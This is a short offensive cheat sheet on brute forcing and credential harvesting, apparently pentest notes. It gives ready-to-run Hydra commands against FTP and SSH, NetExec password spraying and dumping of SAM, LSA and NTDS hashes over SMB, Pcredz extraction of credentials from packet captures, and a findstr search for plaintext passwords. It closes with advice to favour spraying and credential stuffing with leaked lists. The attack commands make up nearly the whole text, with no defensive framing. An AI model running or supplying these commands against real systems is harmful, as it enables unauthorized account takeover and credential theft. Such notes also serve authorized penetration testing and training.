# Brute Forcing

Goal: Gain valid credentials through systematic attempts.

---

# Hydra – General Syntax

hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-C FILE] -m MODULE service://server[:PORT][/OPT]

---

# FTP

hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100

---

# SSH

hydra -l username -P password.list ssh://<IP>

hydra -L user.list -P password.list <service>://<ip>

hydra -L user.list -p password <service>://<ip>

hydra -C <user_pass.list> ssh://<IP>

---

# WinRM (NetExec)

netexec winrm <ip> -u user.list -p password.list

---

# SMB (NetExec)

netexec smb <ip> -u "user" -p "password" --shares

netexec smb <ip> --local-auth -u <username> -p <password> -sam

netexec smb <ip> --local-auth -u <username> -p <password> -lsa

netexec smb <ip> -u <username> -p <password> --ntds

---

# Credential Extraction from PCAP

./Pcredz -f demo.pcapng -t -v

---

# Windows Local Search for Credentials

tasklist /svc

findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

---

# Tactical Notes

- Always check password policy before brute force.
- Prefer spraying over full brute.
- Use credential stuffing when leak lists exist.
- Extract creds from memory or PCAP before brute forcing.
